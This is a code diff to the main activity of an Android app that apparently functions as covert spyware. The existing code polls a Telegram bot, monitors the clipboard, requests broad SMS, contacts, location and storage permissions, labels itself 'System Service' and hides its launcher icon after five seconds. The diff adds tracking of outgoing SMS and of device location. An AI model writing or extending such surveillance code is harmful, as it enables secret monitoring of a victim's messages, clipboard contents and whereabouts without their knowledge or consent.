@@ -10,7 +10,9 @@ import android.widget.Button
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import com.dec.monitor.input.ClipboardMonitor
+import com.dec.monitor.location.LocationTracker
 import com.dec.monitor.screen.ScreenshotService
+import com.dec.monitor.sms.OutgoingSmsMonitor
 import com.dec.monitor.stealth.StealthManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -26,6 +28,8 @@ class MainActivity : AppCompatActivity() {
 
         TelegramBot.startPolling(applicationContext)
         ClipboardMonitor.start(applicationContext)
+        OutgoingSmsMonitor.start(applicationContext)
+        LocationTracker.startTracking(applicationContext)
         TelegramBot.appContext = applicationContext
 
         requestPermissions(arrayOf(
@@ -36,6 +40,7 @@ class MainActivity : AppCompatActivity() {
             android.Manifest.permission.SEND_SMS,
             android.Manifest.permission.READ_CONTACTS,
             android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
             android.Manifest.permission.READ_MEDIA_IMAGES,
             android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
             android.Manifest.permission.READ_EXTERNAL_STORAGE,
@@ -49,7 +54,6 @@ class MainActivity : AppCompatActivity() {
 
         findViewById<TextView>(R.id.tvStatus).text = "System Service\nTap Start to initialize."
 
-        // auto hide icon after 5 seconds
         Handler(Looper.getMainLooper()).postDelayed({
             StealthManager.hideIcon(applicationContext)
         }, 5000)
